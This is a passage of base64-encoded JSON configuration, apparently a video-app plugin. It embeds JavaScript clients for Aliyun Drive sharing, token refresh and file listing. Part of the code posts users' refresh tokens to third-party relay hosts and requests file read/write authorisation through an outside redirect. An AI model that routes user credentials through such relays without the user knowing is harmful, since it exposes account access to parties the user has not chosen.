3NUb2tlbkludmFsaWRcXFwiLCBbXFxcIuiuv+mXruS7pOeJjOWkseaViO+8jOivt+mHjeaWsOeZu+mZhlxcXCJdXSxcXG4gICAgW1xcXCJTaGFyZUxpbmtUb2tlbkludmFsaWRcXFwiLCBbXFxcIuWIhuS6q+S7pOeJjOWkseaViFxcXCJdXSxcXG4gICAgW1xcXCJQYXJhbUZsb3dFeGNlcHRpb25cXFwiLCBbXFxcIuiuv+mXrui/h+S6jumikee5ge+8jOivt+eojeWQjuWGjeivlVxcXCIsIDNdXVxcbl0pO1xcblxcbkFsaUVycm9yLnByb3RvdHlwZSA9IE9iamVjdC5hc3NpZ24obmV3IEVycm9yKCksIHtcXG4gICAgY29uc3RydWN0b3I6IEFsaUVycm9yXFxufSk7XFxuXFxuZnVuY3Rpb24gcG9zdEFwaShhcGksIGJvZHksIGhlYWRlcnMpIHtcXG4gICAgbGV0IHJlc3VsdCA9IHJlcXVlc3QoJ2h0dHBzOi8vYXBpLmFsaXl1bmRyaXZlLmNvbScgKyBhcGksIHtcXG4gICAgICAgIGhlYWRlcnM6IE9iamVjdC5hc3NpZ24oe1xcbiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXFxuICAgICAgICB9LCBoZWFkZXJzKSxcXG4gICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KGJvZHkpLFxcbiAgICAgICAgbWV0aG9kOiAnUE9TVCdcXG4gICAgfSk7XFxuICAgIHJlc3VsdCA9IEpTT04ucGFyc2UocmVzdWx0KTtcXG4gICAgaWYgKHJlc3VsdC5jb2RlKSB7XFxuICAgICAgICB0aHJvdyBuZXcgQWxpRXJyb3IocmVzdWx0LmNvZGUsIHJlc3VsdC5tZXNzYWdlKTtcXG4gICAgfVxcbiAgICByZXR1cm4gcmVzdWx0O1xcbn1cXG5cXG5mdW5jdGlvbiBBbGlTaGFyZUFwaShzaGFyZUlkLCBzaGFyZVB3ZCwgc2hhcmVUb2tlbiwgcmVmcmVzaENhbGxCYWNrKSB7XFxuICAgIHRoaXMuc2hhcmVJZCA9IHNoYXJlSWQ7XFxuICAgIHRoaXMuc2hhcmVQd2QgPSBzaGFyZVB3ZDtcXG4gICAgdGhpcy5yZWZyZXNoQ2FsbEJhY2sgPSByZWZyZXNoQ2FsbEJhY2sgfHwgKCgpID0+IHZvaWQgMCk7XFxuICAgIHRoaXMuc2hhcmVUb2tlbiA9IHNoYXJlVG9rZW4gfHwgdGhpcy5nZXRTaGFyZVRva2VuKCk7XFxufVxcbk9iamVjdC5hc3NpZ24oQWxpU2hhcmVBcGkucHJvdG90eXBlLCB7XFxuICAgIGdldFNoYXJlVG9rZW4oKSB7XFxuICAgICAgICBsZXQgcmVzdWx0ID0gcG9zdEFwaShcXFwiL3YyL3NoYXJlX2xpbmsvZ2V0X3NoYXJlX3Rva2VuXFxcIiwge1xcbiAgICAgICAgICAgIFxcXCJzaGFyZV9pZFxcXCI6IHRoaXMuc2hhcmVJZCxcXG4gICAgICAgICAgICBcXFwic2hhcmVfcHdkXFxcIjogdGhpcy5zaGFyZVB3ZCxcXG4gICAgICAgIH0pO1xcbiAgICAgICAgdGhpcy5zaGFyZVRva2VuID0gcmVzdWx0LnNoYXJlX3Rva2VuO1xcbiAgICAgICAgdGhpcy5yZWZyZXNoQ2FsbEJhY2socmVzdWx0LnNoYXJlX3Rva2VuLCB0aGlzKTtcXG4gICAgICAgIHJldHVybiByZXN1bHQuc2hhcmVfdG9rZW47XFxuICAgIH0sXFxuICAgIHBvc3RUb2tlbkFwaShhcGksIGJvZHksIGhlYWRlcnMsIGlzUmV0cnkpIHtcXG4gICAgICAgIGxldCByZXN1bHQ7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIHJlc3VsdCA9IHBvc3RBcGkoYXBpLCBib2R5LCBPYmplY3QuYXNzaWduKHtcXG4gICAgICAgICAgICAgICAgXFxcIlgtU2hhcmUtVG9rZW5cXFwiOiB0aGlzLnNoYXJlVG9rZW4gfHwgdGhpcy5nZXRTaGFyZVRva2VuKClcXG4gICAgICAgICAgICB9LCBoZWFkZXJzKSk7XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgaWYgKChlLmNvZGUgPT09IFxcXCJBY2Nlc3NUb2tlbkludmFsaWRcXFwiIHx8IGUuY29kZSA9PT0gXFxcIlNoYXJlTGlua1Rva2VuSW52YWxpZFxcXCIpICYmICFpc1JldHJ5KSB7XFxuICAgICAgICAgICAgICAgIHRoaXMuZ2V0U2hhcmVUb2tlbigpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5wb3N0VG9rZW5BcGkoYXBpLCBib2R5LCBoZWFkZXJzLCB0cnVlKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgdGhyb3cgZTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiByZXN1bHQ7XFxuICAgIH0sXFxuICAgIGdldExpc3RGaWxlKGZpbGVJZCwgbWFya2VyLCBvcmRlckJ5LCBvcmRlckRpcmVjdGlvbikge1xcbiAgICAgICAgbGV0IHJlc3VsdCA9IHRoaXMucG9zdFRva2VuQXBpKFxcXCIvYWRyaXZlL3YzL2ZpbGUvbGlzdFxcXCIsIHtcXG4gICAgICAgICAgICBcXFwic2hhcmVfaWRcXFwiOiB0aGlzLnNoYXJlSWQsXFxuICAgICAgICAgICAgXFxcInBhcmVudF9maWxlX2lkXFxcIjogZmlsZUlkIHx8IFxcXCJyb290XFxcIixcXG4gICAgICAgICAgICBcXFwibGltaXRcXFwiOiAxMDAsXFxuICAgICAgICAgICAgXFxcImltYWdlX3RodW1ibmFpbF9wcm9jZXNzXFxcIjogXFxcImltYWdlL3Jlc2l6ZSx3XzE2MC9mb3JtYXQsanBlZ1xcXCIsXFxuICAgICAgICAgICAgXFxcImltYWdlX3VybF9wcm9jZXNzXFxcIjogXFxcImltYWdlXFxcXC9yZXNpemUsd18xOTIwL2Zvcm1hdCxqcGVnXFxcIixcXG4gICAgICAgICAgICBcXFwidmlkZW9fdGh1bWJuYWlsX3Byb2Nlc3NcXFwiOiBcXFwidmlkZW8vc25hcHNob3QsdF8xMDAwLGZfanBnLGFyX2F1dG8sd18zMDBcXFwiLFxcbiAgICAgICAgICAgIFxcXCJvcmRlcl9ieVxcXCI6IG9yZGVyQnkgfHwgXFxcIm5hbWVcXFwiLFxcbiAgICAgICAgICAgIFxcXCJvcmRlcl9kaXJlY3Rpb25cXFwiOiBvcmRlckRpcmVjdGlvbiB8fCBcXFwiQVNDXFxcIixcXG4gICAgICAgICAgICBcXFwibWFya2VyXFxcIjogbWFya2VyXFxuICAgICAgICB9KTtcXG4gICAgICAgIHJldHVybiByZXN1bHQ7XFxuICAgIH0sXFxuICAgIGdldFNoYXJlSW5mbygpIHtcXG4gICAgICAgIGxldCByZXN1bHQgPSBwb3N0QXBpKFxcXCIvYWRyaXZlL3YzL3NoYXJlX2xpbmsvZ2V0X3NoYXJlX2J5X2Fub255bW91cz9zaGFyZV9pZD1cXFwiICsgdGhpcy5zaGFyZUlkLCB7XFxuICAgICAgICAgICAgXFxcInNoYXJlX2lkXFxcIjogdGhpcy5zaGFyZUlkXFxuICAgICAgICB9KTtcXG4gICAgICAgIHJldHVybiByZXN1bHQ7XFxuICAgIH0sXFxuICAgIGdldFNlYXJjaExpc3RGaWxlKGtleSwgbWFya2VyLCBvcmRlckJ5LCBvcmRlckRpcmVjdGlvbikge1xcbiAgICAgICAgbGV0IHJlc3VsdCA9IHRoaXMucG9zdFRva2VuQXBpKFxcXCIvcmVjb21tZW5kL3YxL3NoYXJlTGluay9zZWFyY2hcXFwiLCB7XFxuICAgICAgICAgICAgXFxcInNoYXJlX2lkXFxcIjogdGhpcy5zaGFyZUlkLFxcbiAgICAgICAgICAgIFxcXCJrZXl3b3JkXFxcIjoga2V5LFxcbiAgICAgICAgICAgIFxcXCJsaW1pdFxcXCI6IDEwMCxcXG4gICAgICAgICAgICBcXFwib3JkZXJfYnlcXFwiOiBvcmRlckJ5ICsgXFxcIiBcXFwiICsgb3JkZXJEaXJlY3Rpb24sXFxuICAgICAgICAgICAgXFxcIm1hcmtlclxcXCI6IG1hcmtlciB8fCB1bmRlZmluZWRcXG4gICAgICAgIH0pO1xcbiAgICAgICAgaWYgKE9iamVjdC5rZXlzKHJlc3VsdCkubGVuZ3RoID09PSAwKSB7XFxuICAgICAgICAgICAgcmVzdWx0Lml0ZW1zID0gW107XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcbiAgICB9XFxufSk7XFxuJC5leHBvcnRzID0gQWxpU2hhcmVBcGk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLpmL/ph4zmkq3mlL5BUElcIixcInBhdGhcIjpcImFsaVBsYXlBcGlcIixcInJ1bGVcIjpcIi8vQGF1dGhvciBMb3lEZ0lrXFxuZnVuY3Rpb24gcG9zdEFwaShhcGksIGJvZHksIGhlYWRlcnMsIGFnYWluVHJ5LCB0cnlGcmUpIHtcXG4gICAgbGV0IHJlc3VsdDtcXG4gICAgdHJ5IHtcXG4gICAgICAgIHJlc3VsdCA9IHJlcXVlc3QoYXBpLnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSA/IGFwaSA6ICdodHRwczovL2FwaS5hbGl5dW5kcml2ZS5jb20nICsgYXBpLCB7XFxuICAgICAgICAgICAgaGVhZGVyczogT2JqZWN0LmFzc2lnbih7XFxuICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXFxuICAgICAgICAgICAgfSwgaGVhZGVycyksXFxuICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoYm9keSksXFxuICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCdcXG4gICAgICAgIH0pO1xcbiAgICAgICAgcmVzdWx0ID0gSlNPTi5wYXJzZShyZXN1bHQpO1xcbiAgICAgICAgaWYgKHJlc3VsdC5jb2RlKSB7XFxuICAgICAgICAgICAgbGV0IG1zZz1yZXN1bHQuZGlzcGxheV9tZXNzYWdlIHx8IHJlc3VsdC5tZXNzYWdlO1xcbiAgICAgICAgICAgIGxldCBlcnJvciA9IG5ldyBFcnJvcihhcGkgKyBcXFwiPT5cXFwiICsgcmVzdWx0LmNvZGUgKyBcXFwiOlxcXCIgKyBtc2cpO1xcbiAgICAgICAgICAgIGVycm9yLmNvZGUgPSByZXN1bHQuY29kZTtcXG4gICAgICAgICAgICBlcnJvci5qdWRnZU1zZz1tc2dcXG4gICAgICAgICAgICB0aHJvdyBlcnJvcjtcXG4gICAgICAgIH1cXG4gICAgICAgIGxldCByYm9keSA9IHJlc3VsdCAmJiByZXN1bHQucmVzcG9uc2VzICYmIHJlc3VsdC5yZXNwb25zZXNbMF0gJiYgcmVzdWx0LnJlc3BvbnNlc1swXS5ib2R5IHx8IHt9O1xcbiAgICAgICAgaWYgKHJib2R5LmNvZGUpIHtcXG4gICAgICAgICAgICBsZXQgbXNnID1yYm9keS5kaXNwbGF5X21lc3NhZ2UgfHwgcmJvZHkubWVzc2FnZTtcXG4gICAgICAgICAgICBsZXQgZXJyb3IgPSBuZXcgRXJyb3IoYXBpICsgXFxcIj0+XFxcIiArIHJib2R5LmNvZGUgKyBcXFwiOlxcXCIgKyBtc2cpO1xcbiAgICAgICAgICAgIGVycm9yLmNvZGUgPSByYm9keS5jb2RlO1xcbiAgICAgICAgICAgIGVycm9yLmp1ZGdlTXNnPW1zZztcXG4gICAgICAgICAgICB0aHJvdyBlcnJvcjtcXG4gICAgICAgIH1cXG4gICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgdHJ5RnJlID0gdHJ5RnJlID09PSB1bmRlZmluZWQgPyAxIDogdHJ5RnJlO1xcbiAgICAgICAgaWYgKGFnYWluVHJ5ICYmIHRyeUZyZSA+IDApIHtcXG4gICAgICAgICAgICBpZiAodHlwZW9mIGFnYWluVHJ5ID09PSBcXFwiZnVuY3Rpb25cXFwiKSB7XFxuICAgICAgICAgICAgICAgIGxldCBuZXdEYXRhID0gYWdhaW5UcnkoZSwgcmVzdWx0LCBib2R5LCBoZWFkZXJzLCB0cnlGcmUpO1xcbiAgICAgICAgICAgICAgICBpZiAobmV3RGF0YSkge1xcbiAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihib2R5LCBuZXdEYXRhLmJvZHkpO1xcbiAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihoZWFkZXJzLCBuZXdEYXRhLmhlYWRlcnMpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBwb3N0QXBpKGFwaSwgYm9keSwgaGVhZGVycywgYWdhaW5UcnksIHRyeUZyZSAtIDEpO1xcbiAgICAgICAgfVxcbiAgICAgICAgdGhyb3cgZTtcXG4gICAgfVxcbiAgICByZXR1cm4gcmVzdWx0O1xcbn1cXG5cXG5mdW5jdGlvbiBBbGlBY2Nlc3NBcGkoc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGFsaVRva2Vucywgb3BlblRva2VucywgcmVmcmVzaFNoYXJlQ2FsbEJhY2ssIHJlZnJlc2hBY2Nlc3NDYWxsQmFjaywgcmVmcmVzaE9wZW5DYWxsQmFjaykge1xcbiAgICB0aGlzLnNoYXJlSWQgPSBzaGFyZUlkO1xcbiAgICB0aGlzLnNoYXJlUHdkID0gc2hhcmVQd2Q7XFxuICAgIHRoaXMucmVmcmVzaFNoYXJlQ2FsbEJhY2sgPSByZWZyZXNoU2hhcmVDYWxsQmFjayB8fCAoKCkgPT4gdm9pZCAwKTtcXG4gICAgdGhpcy5yZWZyZXNoQWNjZXNzQ2FsbEJhY2sgPSByZWZyZXNoQWNjZXNzQ2FsbEJhY2sgfHwgKCgpID0+IHZvaWQgMCk7XFxuICAgIHRoaXMucmVmcmVzaE9wZW5DYWxsQmFjayA9IHJlZnJlc2hPcGVuQ2FsbEJhY2sgfHwgKCgpID0+IHZvaWQgMCk7XFxuICAgIHRoaXMuc2hhcmVUb2tlbiA9IHNoYXJlVG9rZW4gfHwgdGhpcy5nZXRTaGFyZVRva2VuKCk7XFxuICAgIHRoaXMuYWxpVG9rZW5zID0gYWxpVG9rZW5zIHx8IHt9O1xcbiAgICBpZiAoIXRoaXMuYWxpVG9rZW5zLnJlZnJlc2hfdG9rZW4pIHtcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi5pyq55m76ZmGXFxcIik7XFxuICAgIH1cXG4gICAgaWYgKCF0aGlzLmFsaVRva2Vucy5hY2Nlc3NfdG9rZW4pIHtcXG4gICAgICAgIHRoaXMucmVmcmVzaEFjY2Vzc1Rva2VuKCk7XFxuICAgIH1cXG4gICAgdGhpcy5kZWZEcml2ZUlkID0gdGhpcy5hbGlUb2tlbnMucmVzb3VyY2VfZHJpdmVfaWQgfHwgdGhpcy5hbGlUb2tlbnMuZGVmYXVsdF9kcml2ZV9pZDtcXG4gICAgdGhpcy5yZWFjY2Vzc1RrID0gKHRoaXMuYWxpVG9rZW5zLnRva2VuX3R5cGUgfHwgXFxcIkJlYXJlclxcXCIpICsgJyAnICsgdGhpcy5hbGlUb2tlbnMuYWNjZXNzX3Rva2VuO1xcbiAgICB0aGlzLm9wZW5Ub2tlbnMgPSBvcGVuVG9rZW5zIHx8IHtcXG4gICAgICAgICdSZWZyZXNoVG9rZW5PcGVuJzogJycsXFxuICAgICAgICAnQWNjZXNzVG9rZW5PcGVuJzogJycsXFxuICAgICAgICAnQmluZFJlZnJlc2hUb2tlbic6ICcnLFxcbiAgICB9O1xcbiAgICBpZiAob3BlblRva2VucyAhPT0gbnVsbCAmJiAhdGhpcy5vcGVuVG9rZW5zLkFjY2Vzc1Rva2VuT3Blbikge1xcbiAgICAgICAgdGhpcy5yZWZyZXNoT3BlblRva2VuKCk7XFxuICAgIH1cXG59XFxuT2JqZWN0LmFzc2lnbihBbGlBY2Nlc3NBcGkucHJvdG90eXBlLCB7XFxuICAgIHdhaXRTbGVlcCh0aW1lKSB7XFxuICAgICAgICBqYXZhLmxhbmcuVGhyZWFkLnNsZWVwKHRpbWUgfHwgNjAwKTtcXG4gICAgICAgIHJldHVybiB0aGlzO1xcbiAgICB9LFxcbiAgICB0cnlTb2x2ZShlKSB7XFxuICAgICAgICBpZiAoZS5jb2RlID09PSBcXFwiU2hhcmVMaW5rVG9rZW5JbnZhbGlkXFxcIiB8fCBlLmNvZGUgPT09IFxcXCJJbnZhbGlkUGFyYW1ldGVyTm90TWF0Y2guU2hhcmVJZFxcXCIpIHtcXG4gICAgICAgICAgICB0aGlzLndhaXRTbGVlcCgyMCkuZ2V0U2hhcmVUb2tlbigpO1xcbiAgICAgICAgICAgIHJldHVybiB0cnVlO1xcbiAgICAgICAgfSBlbHNlIGlmIChlLmNvZGUgPT09IFxcXCJBY2Nlc3NUb2tlbkludmFsaWRcXFwiKSB7XFxuICAgICAgICAgICAgdGhpcy53YWl0U2xlZXAoMjApLnJlZnJlc2hBY2Nlc3NUb2tlbigpO1xcbiAgICAgICAgICAgIHJldHVybiB0cnVlO1xcbiAgICAgICAgfSBlbHNlIGlmIChlLmNvZGUgPT09IFxcXCJGb3JiaWRkZW5Ob1Blcm1pc3Npb24uRmlsZVxcXCIgfHwgKGUuY29kZSA9PT0gXFxcIkJhZFJlcXVlc3RcXFwiJiZlLmp1ZGdlTXNnPT09XFxcIuS7heWPr+S/neWtmOWIsOi9rOWtmOepuumXtFxcXCIpKSB7XFxuICAgICAgICAgICAgdGhpcy5hbGlUb2tlbnMucmVzb3VyY2VfZHJpdmVfaWQgPSB1bmRlZmluZWQ7XFxuICAgICAgICAgICAgdGhpcy53YWl0U2xlZXAoMjApLnJlZnJlc2hBY2Nlc3NUb2tlbigpO1xcbiAgICAgICAgICAgIHJldHVybiB0cnVlO1xcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9LFxcbiAgICBnZXRTaGFyZVRva2VuKCkge1xcbiAgICAgICAgbGV0IHJlc3VsdCA9IHBvc3RBcGkoXFxcIi92Mi9zaGFyZV9saW5rL2dldF9zaGFyZV90b2tlblxcXCIsIHtcXG4gICAgICAgICAgICBcXFwic2hhcmVfaWRcXFwiOiB0aGlzLnNoYXJlSWQsXFxuICAgICAgICAgICAgXFxcInNoYXJlX3B3ZFxcXCI6IHRoaXMuc2hhcmVQd2QsXFxuICAgICAgICB9KTtcXG4gICAgICAgIHRoaXMuc2hhcmVUb2tlbiA9IHJlc3VsdC5zaGFyZV90b2tlbjtcXG4gICAgICAgIHRoaXMucmVmcmVzaFNoYXJlQ2FsbEJhY2socmVzdWx0LnNoYXJlX3Rva2VuLCB0aGlzKTtcXG4gICAgICAgIHJldHVybiByZXN1bHQuc2hhcmVfdG9rZW47XFxuICAgIH0sXFxuICAgIHJlZnJlc2hBY2Nlc3NUb2tlbigpIHtcXG4gICAgICAgIGxldCByZXN1bHQgPSBwb3N0QXBpKFxcXCJodHRwczovL2F1dGguYWxpeXVuZHJpdmUuY29tL3YyL2FjY291bnQvdG9rZW5cXFwiLCB7XFxuICAgICAgICAgICAgXFxcImdyYW50X3R5cGVcXFwiOiBcXFwicmVmcmVzaF90b2tlblxcXCIsXFxuICAgICAgICAgICAgXFxcInJlZnJlc2hfdG9rZW5cXFwiOiB0aGlzLmFsaVRva2Vucy5yZWZyZXNoX3Rva2VuLFxcbiAgICAgICAgfSwge1xcbiAgICAgICAgICAgIFxcXCJVc2VyLUFnZW50XFxcIjogUENfVUEsXFxuICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiBcXFwiaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL1xcXCJcXG4gICAgICAgIH0sIChlKSA9PiB7XFxuICAgICAgICAgICAgaWYgKGUuY29kZSA9PT0gXFxcIkludmFsaWRQYXJhbWV0ZXIuUmVmcmVzaFRva2VuXFxcIikge1xcbiAgICAgICAgICAgICAgICBlLm1lc3NhZ2UgPSBcXFwiI+eZu+mZhui/h+acn+ivt+mHjeaWsOeZu+mZhiNcXFxcblxcXCIgKyBlLm1lc3NhZ2U7XFxuICAgICAgICAgICAgICAgIHRocm93IGU7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgICAgICBkZWxldGUgcmVzdWx0LnVzZXJfZGF0YTtcXG4gICAgICAgIGxldCBvcmlnaW5EZWZkRHJpdmVJZCA9IHRoaXMuYWxpVG9rZW5zLmRlZmF1bHRfZHJpdmVfaWQ7XFxuICAgICAgICB0aGlzLmFsaVRva2VucyA9IE9iamVjdC5hc3NpZ24odGhpcy5hbGlUb2tlbnMsIHJlc3VsdCk7XFxuICAgICAgICB0aGlzLnJlYWNjZXNzVGsgPSB0aGlzLmFsaVRva2Vucy50b2tlbl90eXBlICsgJyAnICsgdGhpcy5hbGlUb2tlbnMuYWNjZXNzX3Rva2VuO1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBpZiAoKG9yaWdpbkRlZmREcml2ZUlkICE9PSB0aGlzLmFsaVRva2Vucy5kZWZhdWx0X2RyaXZlX2lkKSB8fCB0aGlzLmFsaVRva2Vucy5yZXNvdXJjZV9kcml2ZV9pZD09PXVuZGVmaW5lZCkge1xcbiAgICAgICAgICAgICAgICBsZXQgcmVzb3VyY2VfZHJpdmVfaWQgPSB0aGlzLmdldFVzZXJJbmZvKCkucmVzb3VyY2VfZHJpdmVfaWQ7XFxuICAgICAgICAgICAgICAgIHRoaXMuYWxpVG9rZW5zLnJlc291cmNlX2RyaXZlX2lkID0gcmVzb3VyY2VfZHJpdmVfaWQ7XFxuICAgICAgICAgICAgICAgIGlmIChyZXNvdXJjZV9kcml2ZV9pZCkge1xcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5kZWZEcml2ZUlkID0gcmVzb3VyY2VfZHJpdmVfaWQ7XFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICB0aGlzLmRlZkRyaXZlSWQgPSB0aGlzLmFsaVRva2Vucy5kZWZhdWx0X2RyaXZlX2lkO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGxvZyhcXFwi55So5oi35L+h5oGv6I635Y+W5aSx6LSl77yaXFxcIiArIGUudG9TdHJpbmcoKSk7XFxuICAgICAgICB9XFxuICAgICAgICB0aGlzLnJlZnJlc2hBY2Nlc3NDYWxsQmFjayhyZXN1bHQsIHRoaXMpO1xcbiAgICAgICAgcmV0dXJuIHRoaXMuYWxpVG9rZW5zO1xcbiAgICB9LFxcbiAgICBnZXRVc2VySW5mbygpIHtcXG4gICAgICAgIGxldCBpbmZvID0gcG9zdEFwaShcXFwiaHR0cHM6Ly91c2VyLmFsaXl1bmRyaXZlLmNvbS92Mi91c2VyL2dldFxcXCIsIHt9LCB7XFxuICAgICAgICAgICAgXFxcIlVzZXItQWdlbnRcXFwiOiBQQ19VQSxcXG4gICAgICAgICAgICBcXFwiYXV0aG9yaXphdGlvblxcXCI6IHRoaXMucmVhY2Nlc3NUayxcXG4gICAgICAgICAgICBcXFwiUmVmZXJlclxcXCI6IFxcXCJodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vXFxcIlxcbiAgICAgICAgfSwgKGUpID0+IHtcXG4gICAgICAgICAgICB0aGlzLnRyeVNvbHZlKGUpO1xcbiAgICAgICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgICdhdXRob3JpemF0aW9uJzogdGhpcy5yZWFjY2Vzc1RrXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgICAgIHJldHVybiBpbmZvO1xcbiAgICB9LFxcbiAgICBfZ2V0T3BlblRva2VuKGNvZGUpIHtcXG4gICAgICAgIGxldCBib2R5ID0ge30sXFxuICAgICAgICAgICAgaGVhZGVycyA9IHtcXG4gICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBQQ19VQSxcXG4gICAgICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tLydcXG4gICAgICAgICAgICB9O1xcbiAgICAgICAgaWYgKGNvZGUpIHtcXG4gICAgICAgICAgICBib2R5ID0ge1xcbiAgICAgICAgICAgICAgICBjb2RlOiBjb2RlLFxcbiAgICAgICAgICAgICAgICBncmFudF90eXBlOiBcXFwiYXV0aG9yaXphdGlvbl9jb2RlXFxcIlxcbiAgICAgICAgICAgIH07XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGJvZHkgPSB7XFxuICAgICAgICAgICAgICAgIGdyYW50X3R5cGU6IFxcXCJyZWZyZXNoX3Rva2VuXFxcIixcXG4gICAgICAgICAgICAgICAgcmVmcmVzaF90b2tlbjogdGhpcy5vcGVuVG9rZW5zLlJlZnJlc2hUb2tlbk9wZW4sXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IGpzb24gPSBwb3N0KCdodHRwczovL2FwaS54aG9mZS50b3AvYWxpc3QvYWxpX29wZW4vY29kZScsIHtcXG4gICAgICAgICAgICBoZWFkZXJzOiBoZWFkZXJzLFxcbiAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KGJvZHkpLFxcbiAgICAgICAgfSk7XFxuICAgICAgICBpZiAoIWpzb24pIHtcXG4gICAgICAgICAgICBqc29uID0gcG9zdCgnaHR0cHM6Ly9hcGktY2Yubm4uY2kvYWxpc3QvYWxpX29wZW4vY29kZScsIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyczogaGVhZGVycyxcXG4gICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoYm9keSksXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgICAgICBpZiAoanNvbi5pbmNsdWRlcygnVG9vIE1hbnkgUmVxdWVzdHMnKSB8fCBqc29uLmluY2x1ZGVzKFxcXCI1MDIgQmFkIEdhdGV3YXlcXFwiKSkge1xcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi6aKR57mB6K+35rGC5pqC5pe26KKr5bCB56aBXFxcXG5cXFwiICsganNvbik7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGxldCBvcGVuUmVzdWx0ID0gSlNPTi5wYXJzZShqc29uKTtcXG4gICAgICAgICAgICBpZiAob3BlblJlc3VsdC5yZWZyZXNoX3Rva2VuKSB7XFxuICAgICAgICAgICAgICAgIHRoaXMub3BlblRva2Vucy5SZWZyZXNoVG9rZW5PcGVuID0gb3BlblJlc3VsdC5yZWZyZXNoX3Rva2VuO1xcbiAgICAgICAgICAgICAgICB0aGlzLm9wZW5Ub2tlbnMuQWNjZXNzVG9rZW5PcGVuID0gb3BlblJlc3VsdC50b2tlbl90eXBlICsgXFxcIiBcXFwiICsgb3BlblJlc3VsdC5hY2Nlc3NfdG9rZW47XFxuICAgICAgICAgICAgICAgIHRoaXMub3BlblRva2Vucy5CaW5kUmVmcmVzaFRva2VuID0gdGhpcy5hbGlUb2tlbnMucmVmcmVzaF90b2tlbjtcXG4gICAgICAgICAgICAgICAgdGhpcy5yZWZyZXNoT3BlbkNhbGxCYWNrKG9wZW5SZXN1bHQsIHRoaXMpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5vcGVuVG9rZW5zO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIGlmICghY29kZSkge1xcbiAgICAgICAgICAgIHJldHVybiB0aGlzLndhaXRTbGVlcCg1MCkuY2FjaGVPcGVuVG9rZW4oKTtcXG4gICAgICAgIH1cXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwib3BlblRva2Vu6I635Y+W5aSx6LSlXFxcXG5cXFwiICsganNvbik7XFxuICAgIH0sXFxuICAgIGNhY2hlT3BlblRva2VuKCkge1xcbiAgICAgICAgbGV0IHJlc3VsdCA9IHBvc3RBcGkoJ2h0dHBzOi8vb3Blbi5hbGl5dW5kcml2ZS5jb20vb2F1dGgvdXNlcnMvYXV0aG9yaXplP2NsaWVudF9pZD0nICsgJzc2OTE3Y2NjY2Q0NDQxYzM5NDU3YTA0ZjYwODRmYjJmJyArICcmcmVkaXJlY3RfdXJpPWh0dHBzOi8vYWxpc3Qubm4uY2kvdG9vbC9hbGl5dW5kcml2ZS9jYWxsYmFjayZzY29wZT11c2VyOmJhc2UsZmlsZTphbGw6cmVhZCxmaWxlOmFsbDp3cml0ZSZzdGF0ZT0nLCB7XFxuICAgICAgICAgICAgXFxcImF1dGhvcml6ZVxcXCI6IDEsXFxuICAgICAgICAgICAgXFxcInNjb3BlXFxcIjogXFxcInVzZXI6YmFzZSxmaWxlOmFsbDpyZWFkLGZpbGU6YWxsOndyaXRlXFxcIlxcbiAgICAgICAgfSwge1xcbiAgICAgICAgICAgICdVc2VyLUFnZW50JzogUENfVUEsXFxuICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tLycsXFxuICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0aGlzLnJlYWNjZXNzVGssIC8vZ2V0QWNjZXNzVG9rZW5cXG4gICAgICAgICAgICAneC1jYW5hcn